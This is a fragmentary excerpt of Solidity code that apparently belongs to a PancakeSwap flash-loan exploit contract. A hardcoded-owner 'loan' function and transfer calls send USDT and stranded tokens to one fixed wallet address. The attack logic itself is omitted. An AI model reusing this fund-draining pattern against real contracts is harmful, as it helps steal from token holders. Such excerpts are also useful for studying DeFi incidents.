...
IPancakePair LP= IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    function loan(uint256 amount) public payable{
            require(msg.sender ==0x8D78a4d4d8FC939a786105Cb474dE98c54452cD3, "fuck u");
...
IERC20(usdt).transfer(0x8D78a4d4d8FC939a786105Cb474dE98c54452cD3,U);
    }
...
strandedToken.transfer(0x8D78a4d4d8FC939a786105Cb474dE98c54452cD3,amount1);
}
}